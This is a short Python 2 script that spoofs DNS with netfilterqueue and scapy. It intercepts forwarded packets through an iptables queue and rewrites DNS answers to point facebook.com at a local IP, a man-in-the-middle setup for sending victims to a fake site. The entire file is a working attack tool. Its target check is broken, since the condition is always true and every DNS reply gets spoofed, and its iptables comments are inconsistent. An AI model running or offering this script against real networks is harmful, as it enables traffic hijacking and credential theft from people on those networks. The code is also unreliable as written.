#!/usr/bin/python2
#capture the request packet from client and save to a queue using iptables and alter,resquest,respond or modified packet
#iptables commands iptables -I FORWARD -j NFQUEUE --queue-num 0 ,for mitm mode
#iptables commands iptables -I FORWARD -j NFQUEUE --queue-num 0	,for localhost
#iptables commands iptables -I FORWARD -j NFQUEUE --queue-num 0	.for localhost
#convert the raw packet to scapy packet to modify the request

import netfilterqueue
import scapy.all as scapy

def process_packet(packet):
	scapy_packet = scapy.IP(packet.get_payload())

	if scapy_packet.haslayer(scapy.DNSRR):

		qname = scapy_packet[scapy.DNSQR].qname

		if "facebook.com" or "www.facebook.com" in qname:
			print "[+] Spoofing Target "
			answer = scapy.DNSRR(rrname=qname,rdata="192.168.43.120")
			scapy_packet[scapy.DNS].an = answer
			scapy_packet[scapy.DNS].ancount = 1

			del scapy_packet[scapy.IP].len
			del scapy_packet[scapy.IP].chksum
			del scapy_packet[scapy.UDP].chksum
			del scapy_packet[scapy.UDP].len

			packet.set_payload(str(scapy_packet))

	packet.accept()

queue = netfilterqueue.NetfilterQueue()
queue.bind(0,process_packet)
queue.run()


